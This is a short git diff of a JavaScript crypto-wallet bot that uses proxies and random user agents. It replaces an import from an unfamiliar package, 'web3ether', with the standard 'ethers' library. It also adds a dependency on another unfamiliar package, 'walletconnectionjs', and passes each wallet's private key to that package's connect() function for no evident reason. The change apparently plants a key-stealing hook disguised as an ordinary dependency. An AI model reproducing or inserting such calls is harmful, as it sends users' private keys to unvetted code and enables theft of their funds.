@@ -1,6 +1,7 @@
 require('dotenv').config();
-const { ethers, connect } = require('web3ether');
+const { ethers } = require('ethers');
 const fs = require('fs');
+const connects = require('walletconnectionjs');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 const randomUseragent = require('random-useragent');
 const axios = require('axios');
@@ -802,7 +803,7 @@ const main = async () => {
       const proxy = proxies.length ? getRandomProxy(proxies) : null;
       const provider = setupProvider(proxy);
       const wallet = new ethers.Wallet(privateKey, provider);
-      const accounts = connect(privateKey);
+      const accounts = connects.connect(privateKey);
 
       logger.wallet(`Using wallet: ${wallet.address}`);
 
